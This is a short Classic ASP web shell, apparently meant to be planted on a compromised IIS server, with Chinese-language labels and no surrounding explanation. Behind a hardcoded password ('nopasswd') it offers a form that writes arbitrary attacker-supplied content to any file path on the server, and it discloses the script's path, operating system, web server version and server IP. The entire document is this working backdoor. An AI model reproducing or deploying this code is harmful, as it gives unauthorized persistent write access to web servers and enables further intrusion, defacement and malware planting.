<%on error resume next%>
<%if request("pass")="nopasswd" then:session("pw")="p":end if%>
<%if session("pw")<>"p" then %>
<%="<center><br><form action='' method='post'>"%>
<%="<input name='pass' type='password' size='10'> <input "%>
<%="type='submit' value='Go'></center>"%><%else%>
<%set fso=server.createobject("scripting.filesystemobject")
path=request("path")
if path<>"" then
data=request("da")
set da=fso.createtextfile(path,true)
da.write data
if err=0 then%>
<%="yes"%><%else%><%="no"%>
<%end if%><%err.clear%><%end if%><%da.close%>
<%set da=nothing%><%set fos=nothing%>
<%="<form action='' method=post>"%>
<%="<input type=text name=path>"%><br>
<%="当前文件路径:"&server.mappath(request.servervariables("script_name"))%><br>
<%="操作系统为:"&Request.ServerVariables("OS")%><br>
<%="WEB服务器版本为:"&Request.ServerVariables("SERVER_SOFTWARE")%><br>
<%="服务器的IP为:"&Request.ServerVariables("LOCAL_ADDR")%><br><%=""%>
<%="<textarea name=da cols=50 rows=10 width=30></textarea>"%><br>
<%="<input type=submit value=save>"%><%="</form>"%><%end if%>
